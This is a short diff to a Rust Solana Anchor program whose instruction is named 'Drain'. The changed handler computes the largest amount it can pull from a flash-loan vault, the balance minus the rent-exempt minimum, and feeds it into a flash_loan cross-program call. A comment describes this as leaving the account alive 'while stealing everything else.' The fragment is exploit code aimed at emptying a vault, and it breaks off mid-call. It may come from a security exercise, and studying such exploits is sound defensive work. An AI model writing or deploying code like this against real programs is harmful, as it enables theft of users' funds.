@@ -17,7 +17,18 @@ pub struct Drain<'info> {
     pub flashloan_program: UncheckedAccount<'info>,
 }
 
-pub fn handler(ctx: Context<Drain>, amount: u64) -> Result<()> {
+pub fn handler(ctx: Context<Drain>) -> Result<()> {
+    // Maximum extractable = vault balance - rent-exempt minimum for the vault account.
+    // Leaving exactly the minimum keeps the account alive while stealing everything else.
+    let rent = Rent::get()?;
+    let min_balance = rent.minimum_balance(flashloan::Vault::LEN);
+    let amount = ctx.accounts.vault.lamports().saturating_sub(min_balance);
+
+    if amount == 0 {
+        msg!("Vault has no funds to drain");
+        return Ok(());
+    }
+
     flashloan::cpi::flash_loan(
         CpiContext::new(
             ctx.accounts.flashloan_program.key(),
